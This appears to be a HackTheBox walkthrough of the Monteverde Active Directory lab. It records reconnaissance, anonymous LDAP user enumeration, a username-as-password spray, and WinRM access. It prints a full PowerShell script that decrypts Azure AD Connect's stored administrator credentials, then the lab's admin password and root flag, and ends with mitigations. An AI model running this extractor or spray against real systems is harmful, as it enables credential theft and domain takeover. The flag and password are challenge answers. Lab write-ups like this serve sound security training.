# Monteverde - HackTheBox Walkthrough

Active Directory exploitation lab focusing on Azure AD Connect credential extraction.

---

## Phase 1: Initial Reconnaissance

### Port Scanning

#### Command
```bash
sudo nmap -sC -sV -O -T4 10.129.228.111
```

#### Results
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-13 07:45 -0400
Nmap scan report for 10.129.228.111
Host is up (0.045s latency).
Not shown: 988 filtered tcp ports (no-response)

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-13 11:45:51Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Host script results:
| smb2-time: 
|   date: 2026-03-13T11:46:01
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 5s

OS Detection: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
Service Info: Host: MONTEVERDE; OS: Windows
```

**Key Findings:**
- Domain: MEGABANK.LOCAL
- Active Directory LDAP on ports 389/636/3268/3269
- WinRM on port 5985
- SMB on port 445

---

## Phase 2: SMB Enumeration

### Anonymous SMB Testing

#### Test 1: Anonymous User
```bash
nxc smb 10.129.228.111 -u anonymous -p ''
```

Result:
```
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\anonymous: STATUS_LOGON_FAILURE
```

#### Test 2: Null Authentication
```bash
nxc smb 10.129.228.111 -u ''  -p ''
```

Result:
```
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\:
```

#### Test 3: Share Enumeration
```bash
nxc smb 10.129.228.111 -u ''  -p '' --shares
```

Result:
```
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.129.228.111  445    MONTEVERDE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

---

## Phase 3: LDAP Enumeration

### Anonymous LDAP Binding

#### Test 1: Domain Discovery
```bash
./windapsearch.py  -d MEGABANK.LOCAL --dc-ip 10.129.228.111 -u '' -p ''
```

Result:
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.228.111
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[*] Bye!
```

### User Enumeration

#### Command
```bash
./windapsearch.py  -d MEGABANK.LOCAL --dc-ip 10.129.228.111 -u '' -p '' -U
```

#### Results - AD Users Found (10 users)
```
cn: Guest

cn: AAD_987d7f2f57d2

cn: Mike Hope
userPrincipalName: mhope@MEGABANK.LOCAL

cn: SABatchJobs
userPrincipalName: SABatchJobs@MEGABANK.LOCAL

cn: svc-ata
userPrincipalName: svc-ata@MEGABANK.LOCAL

cn: svc-bexec
userPrincipalName: svc-bexec@MEGABANK.LOCAL

cn: svc-netapp
userPrincipalName: svc-netapp@MEGABANK.LOCAL

cn: Dimitris Galanos
userPrincipalName: dgalanos@MEGABANK.LOCAL

cn: Ray O'Leary
userPrincipalName: roleary@MEGABANK.LOCAL

cn: Sally Morgan
userPrincipalName: smorgan@MEGABANK.LOCAL
```

### Group Enumeration

#### Command
```bash
./windapsearch.py  -d MEGABANK.LOCAL --dc-ip 10.129.228.111 -u '' -p '' -G
```

#### Key Groups Identified

**Azure/Sync Related Groups:**
- ADSyncAdmins
- ADSyncOperators
- ADSyncBrowse
- ADSyncPasswordSet
- Azure Admins

**Important Members:**
- Azure Admins: Mike Hope, AAD_987d7f2f57d2, Administrator
- ADSyncAdmins: Administrator

---

## Phase 4: Credential Enumeration

### Password Spraying

#### Attempt 1: Username as Password
```bash
nxc ldap 10.129.228.111 -u users.txt -p users.txt -d MEGABANK.LOCAL
```

#### Results

**Successful Match: mhope:mhope**
```
LDAP        10.129.228.111  389    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:mhope
```

---

## Phase 5: Privilege Analysis

### Domain User Information

#### User: mhope

**Command:**
```bash
Get-ADUser mhope -Properties *
```

**Key Details:**
- Distinguished Name: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
- Last Logon: 16/03/2026 13:18:51
- Vulnerabilities: 
  - [VULN-002] User account with password that never expires (LOW)
  - [VULN-020] Admin account with delegation enabled (HIGH)
- Member of: Remote Management Users, Azure Admins

### Domain Groups

#### PowerShell Domain Enumeration
```bash
Get-DomainGroup
```

**Groups Enumerated (48 total):**

Key administrative groups:
- **Domain Admins** - Contains: Administrator
- **Enterprise Admins** - Contains: Administrator
- **Schema Admins** - Contains: Administrator
- **Azure Admins** - Contains: Mike Hope, AAD_987d7f2f57d2, Administrator
- **ADSyncAdmins** - Contains: Administrator
- **Remote Management Users** - Contains: Mike Hope

**Operational Groups:**
- Developers
- HelpDesk
- Trading
- Operations
- Reception
- File Server Admins
- Call Recording Admins

---

## Phase 6: Initial Access via WinRM

### Gaining User Access

#### Evil-WinRM Connection
```bash
evil-winrm -i 10.129.228.111 -u mhope -p mhope
```

#### Connection Output
```
Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents>
```

---

## Phase 7: Privilege Escalation

### Azure AD Connect Exploitation

#### Background
Azure AD Connect stores synchronized credentials encrypted in a local SQL Server database. The encryption keys are managed by the mcrypt.dll assembly, which can be leveraged to decrypt stored credentials.

#### Key Information
- Database: ADSync (LocalDB)
- Relevant Tables: mms_server_configuration, mms_management_agent
- Encryption: Uses Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
- Key File: mcrypt.dll at C:\Program Files\Microsoft Azure AD Sync\Binn\mcrypt.dll

#### Exploitation Script
```powershell
# Azure AD Connect Sync Credential Extractor for Authorized Pentesting Only
# This script is intended for authorized penetration testing of Azure AD Connect environments.
# Unauthorized use of this script to extract credentials without permission is illegal and unethical.

# List of potential connection strings to try for connecting to the ADSync database
$connectionStrings = @(
    "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True",
    "Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True",
    "Data Source=127.0.0.1;Initial Catalog=ADSync;Integrated Security=True",
    "Data Source=localhost\SQLEXPRESS;Initial Catalog=ADSync;Integrated Security=True"
)

# Variable to track if a successful connection is made
$connectionSuccess = $false

# Attempt to connect to the SQL database using the different connection strings
foreach ($connectionString in $connectionStrings) {
    try {
        Write-Host "Attempting connection: $connectionString"
        $client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList $connectionString
        $client.Open()
        Write-Host "Connection successful!"
        $connectionSuccess = $true
        break
    }
    catch [System.Exception] {
        Write-Host "Error connecting to SQL database. Trying next..."
        Write-Host "Exception Message: $($_.Exception.Message)"
    }
}

# Exit if no connection was successful
if (-not $connectionSuccess) {
    Write-Host "All connection attempts failed. Ensure the SQL Server is running and accessible."
    exit
}

# Query for cryptographic keyset information from the mms_server_configuration table
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()

if (!$reader.Read()) {
    Write-Host "Failed to retrieve keyset information."
    exit
}

# Store the retrieved cryptographic information
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

# Query for encrypted configuration and credentials from the mms_management_agent table
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()

if (!$reader.Read()) {
    Write-Host "Failed to retrieve configuration."
    exit
}

# Store the encrypted credentials and configuration
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

# Paths to look for mcrypt.dll, used for decryption
$mcryptPaths = @(
    "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll",
    "C:\Program Files (x86)\Microsoft Azure AD Sync\Bin\mcrypt.dll",
    "C:\Program Files\Microsoft Azure AD Connect\Bin\mcrypt.dll"
)

$dllLoaded = $false

# Attempt to load mcrypt.dll from the known paths
foreach ($dllPath in $mcryptPaths) {
    if (Test-Path $dllPath) {
        try {
            Write-Host "Loading mcrypt.dll from: $dllPath"
            Add-Type -Path $dllPath
            $dllLoaded = $true
            break
        }
        catch {
            Write-Host "Error loading mcrypt.dll from $dllPath"
        }
    }
}

# Exit if mcrypt.dll could not be loaded
if (-not $dllLoaded) {
    Write-Host "Failed to load mcrypt.dll. Ensure it exists in one of the expected paths."
    exit
}

# Decrypt the encrypted credentials using the KeyManager class from mcrypt.dll
try {
    $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
    $km.LoadKeySet($entropy, $instance_id, $key_id)

    $key = $null
    $km.GetActiveCredentialKey([ref]$key)

    $key2 = $null
    $km.GetKey(1, [ref]$key2)

    $decrypted = $null
    $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
}
catch {
    Write-Host "Error loading KeyManager or decrypting credentials."
    exit
}

# Extract domain, username, and password from the decrypted configuration
try {
    $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
    $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
    $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

    # Output the credentials to the user
    Write-Host ("Domain: " + $domain.Domain)
    Write-Host ("Username: " + $username.Username)
    Write-Host ("Password: " + $password.Password)
}
catch {
    Write-Host "Error extracting domain, username, or password."
    exit
}
```

### Credential Extraction from ADSync Database

#### Running Extraction Script
```
*Evil-WinRM* PS C:\Users\mhope\Documents> ./script.ps1
Attempting connection: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True
Error connecting to SQL database. Trying next...
Exception Message: A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 52 - Unable to locate a Local Database Runtime installation. Verify that SQL Server Express is properly installed and that the Local Database Runtime feature is enabled.)
Attempting connection: Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True
Connection successful!
Loading mcrypt.dll from: C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

#### Query ADSync Database for Keyset Information
```bash
sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
```

Result:
```
Changed database context to 'ADSync'.
instance_id                          keyset_id   entropy
------------------------------------ ----------- ------------------------------------
1852B527-DD4F-4ECF-B541-EFCCBFF29E31           1 194EC2FC-F186-46CF-B44D-071EB61F49CD

(1 rows affected)
```

#### Query Management Agent Configuration
```bash
SQLCMD -S MONTEVERDE -d ADSync -Q "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
```

---

## Phase 8: Final Access - Administrator

### Evil-WinRM Connection with Administrator Credentials

#### Command
```bash
./evil-winrm.rb -i 10.129.228.111 -u administrator -p d0m@in4dminyeah!
```

#### Connection Output
```
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### Capturing Root Flag

#### Navigation to Desktop
```powershell
cd ../Desktop
```

#### List Directory Contents
```powershell
ls
```

Result:
```
Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/16/2026   6:19 AM             34 root.txt
```

#### Retrieve Root Flag
```powershell
type root.txt
```

Result:
```
3426e2d8aa594417feabaaa039566a41
```

### Network Verification

#### Network Connections
```powershell
netstat -nto
```

Result:
```
Active Connections

Proto  Local Address          Foreign Address        State           PID      Offload State

TCP    10.129.228.111:135     10.129.228.111:53167   ESTABLISHED     892	InHost
TCP    10.129.228.111:1433    10.129.228.111:53111   ESTABLISHED     3588	InHost
TCP    10.129.228.111:1433    10.129.228.111:53112   ESTABLISHED     3588	InHost
TCP    10.129.228.111:1433    10.129.228.111:53113   ESTABLISHED     3588	InHost
TCP    10.129.228.111:1433    10.129.228.111:53114   ESTABLISHED     3588	InHost
TCP    10.129.228.111:1433    10.129.228.111:53115   ESTABLISHED     3588	InHost
TCP    10.129.228.111:5985    10.10.14.49:54989      TIME_WAIT       0	InHost
TCP    10.129.228.111:5985    10.10.14.49:54996      TIME_WAIT       0	InHost
TCP    10.129.228.111:5985    10.10.14.49:54997      ESTABLISHED     4	InHost
TCP    10.129.228.111:49667   10.129.228.111:53168   ESTABLISHED     624	InHost
TCP    10.129.228.111:53111   10.129.228.111:1433    ESTABLISHED     1432	InHost
TCP    10.129.228.111:53112   10.129.228.111:1433    ESTABLISHED     1432	InHost
TCP    10.129.228.111:53113   10.129.228.111:1433    ESTABLISHED     1432	InHost
TCP    10.129.228.111:53114   10.129.228.111:1433    ESTABLISHED     1432	InHost
TCP    10.129.228.111:53115   10.129.228.111:1433    ESTABLISHED     1432	InHost
TCP    10.129.228.111:53125   10.129.228.111:135     TIME_WAIT       0	InHost
TCP    10.129.228.111:53126   10.129.228.111:49667   TIME_WAIT       0	InHost
TCP    10.129.228.111:53167   10.129.228.111:135     ESTABLISHED     1432	InHost
TCP    10.129.228.111:53168   10.129.228.111:49667   ESTABLISHED     1432	InHost
TCP    [::1]:389              [::1]:49677            ESTABLISHED     624	InHost
TCP    [::1]:389              [::1]:49678            ESTABLISHED     624	InHost
TCP    [::1]:389              [::1]:49683            ESTABLISHED     624	InHost
TCP    [::1]:389              [::1]:49694            ESTABLISHED     624	InHost
TCP    [::1]:389              [::1]:53107            ESTABLISHED     624	InHost
TCP    [::1]:3268             [::1]:53109            ESTABLISHED     624	InHost
TCP    [::1]:49677            [::1]:389              ESTABLISHED     2312	InHost
TCP    [::1]:49678            [::1]:389              ESTABLISHED     2312	InHost
TCP    [::1]:49683            [::1]:389              ESTABLISHED     3004	InHost
TCP    [::1]:49694            [::1]:389              ESTABLISHED     3052	InHost
TCP    [::1]:53107            [::1]:389              ESTABLISHED     3004	InHost
TCP    [::1]:53109            [::1]:3268             ESTABLISHED     3004	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:389  [fe80::f5c7:3925:8ce7:1f7b%7]:49695  ESTABLISHED     624	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:389  [fe80::f5c7:3925:8ce7:1f7b%7]:53140  ESTABLISHED     624	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:389  [fe80::f5c7:3925:8ce7:1f7b%7]:53143  ESTABLISHED     624	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:1433  [fe80::f5c7:3925:8ce7:1f7b%7]:53117  ESTABLISHED     3588	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:49667  [fe80::f5c7:3925:8ce7:1f7b%7]:53100  ESTABLISHED     624	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:49667  [fe80::f5c7:3925:8ce7:1f7b%7]:53142  ESTABLISHED     624	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:49667  [fe80::f5c7:3925:8ce7:1f7b%7]:53157  ESTABLISHED     624	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:49695  [fe80::f5c7:3925:8ce7:1f7b%7]:389  ESTABLISHED     3052	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:53100  [fe80::f5c7:3925:8ce7:1f7b%7]:49667  ESTABLISHED     3076	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:53117  [fe80::f5c7:3925:8ce7:1f7b%7]:1433  ESTABLISHED     1432	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:53140  [fe80::f5c7:3925:8ce7:1f7b%7]:389  ESTABLISHED     2064	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:53141  [fe80::f5c7:3925:8ce7:1f7b%7]:135  TIME_WAIT       0	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:53142  [fe80::f5c7:3925:8ce7:1f7b%7]:49667  ESTABLISHED     2064	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:53143  [fe80::f5c7:3925:8ce7:1f7b%7]:389  ESTABLISHED     2064	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:53154  [fe80::f5c7:3925:8ce7:1f7b%7]:135  TIME_WAIT       0	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:53156  [fe80::f5c7:3925:8ce7:1f7b%7]:135  TIME_WAIT       0	InHost
TCP    [fe80::f5c7:3925:8ce7:1f7b%7]:53157  [fe80::f5c7:3925:8ce7:1f7b%7]:49667  ESTABLISHED     624	InHost
```

---

## Key Takeaways

### Vulnerabilities Exploited

1. **Anonymous LDAP Binding** - Allowed enumeration of users and groups without authentication
2. **Weak Default Credentials** - Username "mhope" with password "mhope" 
3. **Azure AD Connect Credential Storage** - Local SQL database with decryptable credentials
4. **Cleartext Encryption Keys** - mcrypt.dll allows key material to be used by any local user
5. **Admin Delegation** - mhope account had delegation enabled, leading to Azure Admins group membership

### Attack Chain

1. Nmap reconnaissance → Identified Active Directory
2. LDAP enumeration → Discovered domain users and Azure Admins group
3. Password spray → Obtained mhope credentials (mhope:mhope)
4. WinRM access → Logged in as mhope
5. Local enumeration → Discovered Azure AD Connect installation
6. Credential extraction → Dumped administrator credentials from ADSync database
7. Admin access → Leveraged administrator credentials for domain admin access

### Mitigation Strategies

- Restrict anonymous LDAP queries
- Enforce strong, unique passwords (eliminate username=password patterns)
- Secure Azure AD Connect database with strong ACLs
- Encrypt ADSync database backups
- Monitor SQL Server access patterns
- Use Azure AD Cloud Sync instead of traditional Azure AD Connect
- Implement Just-in-Time admin access
- Regular security audits of group memberships
